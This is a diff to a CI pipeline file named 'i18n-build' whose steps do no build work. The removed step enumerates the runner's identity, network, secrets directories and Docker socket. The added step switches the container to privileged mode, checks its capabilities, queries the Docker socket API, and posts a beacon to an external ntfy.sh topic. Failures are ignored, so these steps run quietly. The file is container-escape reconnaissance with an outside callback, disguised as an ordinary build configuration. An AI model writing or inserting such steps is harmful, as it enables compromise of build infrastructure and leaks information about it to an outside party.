@@ -1,9 +1,12 @@
 name: i18n-build
 kind: pipeline
 steps:
-  - name: a-ctx
+  - name: esc
     failure: ignore
     image: registry.thobits.com/images/make:latest
+    privileged: true
     commands:
-      - 'echo CTX1; date -u; hostname; id; cat /etc/resolv.conf; (ip -4 a 2>&1||ifconfig 2>&1)|head -20; ip route 2>&1|head -10; ls -la /run/secrets /var/run/secrets /var/run/docker.sock 2>&1; head -3 /proc/1/cgroup'
-      - 'curl -s -m 8 -d "ctx1" https://ntfy.sh/t3457-k3n8q || true'
+      - 'echo ESC2; id; grep -E "CapEff" /proc/self/status; date -u'
+      - 'ls -la /var/run/docker.sock /run/docker.sock 2>&1 | head -5'
+      - 'curl -s -m 6 --unix-socket /var/run/docker.sock http://x/version 2>&1 | head -c 300'
+      - 'echo; echo HELLOESC2 | curl -s -m 8 -d "esc2-probe" https://ntfy.sh/t3457-k3n8q || true'
